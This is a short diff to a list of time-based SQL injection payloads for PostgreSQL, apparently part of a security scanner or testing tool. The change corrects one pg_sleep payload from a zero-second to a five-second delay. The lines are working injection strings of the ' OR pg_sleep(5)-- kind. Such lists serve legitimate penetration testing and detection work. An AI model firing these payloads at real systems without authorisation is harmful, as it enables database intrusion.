@@ -81,7 +81,7 @@ sql_payloads_by_attack_type = {
         "PostgreSQL": [
             ("' OR pg_sleep(5)--",),
             ("' AND pg_sleep(5)--", ),
-            ("' || pg_sleep(0)--", ),
+            ("' || pg_sleep(5)--", ),
             ("' ; pg_sleep(5)--", ),
             ("' # pg_sleep(5)--", ),
             ("'/*' OR pg_sleep(5)--", ),
